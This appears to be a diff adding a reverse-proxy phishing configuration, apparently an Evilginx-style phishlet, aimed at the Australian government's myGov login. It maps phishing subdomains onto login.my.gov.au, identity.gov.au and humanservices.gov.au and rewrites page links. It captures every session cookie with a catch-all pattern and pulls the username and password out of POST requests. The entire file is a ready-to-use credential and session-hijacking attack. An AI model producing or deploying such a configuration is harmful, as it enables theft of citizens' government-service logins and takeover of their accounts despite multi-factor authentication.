@@ -1,0 +1,44 @@
+author: '@regrexs'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'my.gov.au', session: true, is_landing: true}
+  - {phish_sub: 'my', orig_sub: 'my', domain: 'gov.au', session: false, is_landing: false}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'identity.gov.au', session: false, is_landing: false}
+  - {phish_sub: 'legacy', orig_sub: 'legacy', domain: 'my.gov.au', session: false, is_landing: false}
+  - {phish_sub: 'dynatrace', orig_sub: 'dynatrace', domain: 'humanservices.gov.au', session: false, is_landing: false}
+  - {phish_sub: 'apigw', orig_sub: 'apigw', domain: 'my.gov.au', session: false, is_landing: false}
+  - {phish_sub: 'adobeedge', orig_sub: 'adobeedge', domain: 'my.gov.au', session: false, is_landing: false}
+  
+sub_filters:
+  - {triggers_on: 'login', orig_sub: 'login', domain: '.my.gov.au', search: 'href="https://{hostname}/mga/sps/auth', replace: 'href="https://{hostname}/mga/sps/auth', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'my.gov.au', orig_sub: 'my', domain: 'gov.au', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'auth.identity.gov.au', orig_sub: 'auth', domain: 'identity.gov.au', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'legacy.my.gov.au', orig_sub: 'legacy', domain: 'my.gov.au', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'dynatrace.humanservices.gov.au', orig_sub: 'dynatrace', domain: 'humanservices.gov.au', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'apigw.my.gov.au', orig_sub: 'apigw', domain: 'my.gov.au', search: 'href="https://{hostname}/mygov/ext', replace: 'href="https://{hostname}/mygov/ext', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'adobeedge.my.gov.au', orig_sub: 'adobeedge', domain: 'my.gov.au', search: 'href="https://{hostname}/ee/aus3/v1/identity/', replace: 'href="https://{hostname}/ee/aus3/v1/identity/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+auth_tokens:
+  - domain: 'login.my.gov.au'
+    keys: ['.*,regexp']
+  - domain: '.my.gov.au'
+    keys: ['.*,regexp']
+  
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'POST'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'POST'
+
+auth_urls:
+  - '/auth-callback'
+
+login:
+  domain: 'login.my.gov.au'
+  path: '/auth-callback'
